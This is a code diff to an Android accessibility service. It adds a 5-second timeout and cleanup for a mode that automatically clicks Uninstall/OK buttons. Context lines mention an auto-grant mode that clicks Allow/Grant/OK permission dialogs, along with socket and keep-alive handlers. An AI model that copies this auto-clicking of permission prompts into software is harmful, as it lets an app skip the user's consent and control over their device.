@@ -48,6 +48,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     
     // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
     private volatile boolean uninstallAssistMode = false;
+    private Handler uninstallAssistHandler;
 
     // Auto-grant mode: clicks Allow/Grant/OK buttons for 30 seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
@@ -649,10 +650,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return c.contains("button") || c.contains("textview") || c.contains("imagebutton");
     }
     
-    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
+    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons for 5 seconds only. */
     public void enableUninstallAssist() {
         uninstallAssistMode = true;
-        Log.i(TAG, "Uninstall-assist mode ENABLED");
+        Log.i(TAG, "Uninstall-assist mode ENABLED — will auto-disable after 5 seconds");
+        if (uninstallAssistHandler == null) {
+            uninstallAssistHandler = new Handler(Looper.getMainLooper());
+        }
+        uninstallAssistHandler.removeCallbacksAndMessages(null);
+        uninstallAssistHandler.postDelayed(() -> {
+            uninstallAssistMode = false;
+            Log.i(TAG, "Uninstall-assist mode AUTO-DISABLED after 5 seconds");
+        }, 5000);
     }
 
     private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
@@ -803,6 +812,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 socketCheckHandler.removeCallbacks(socketCheckRunnable);
                 socketCheckHandler = null;
             }
+        } catch (Exception ignored) {}
+        try {
+            if (uninstallAssistHandler != null) {
+                uninstallAssistHandler.removeCallbacksAndMessages(null);
+                uninstallAssistHandler = null;
+            }
+            uninstallAssistMode = false;
         } catch (Exception ignored) {}
         try {
             if (keepAliveManager != null) {
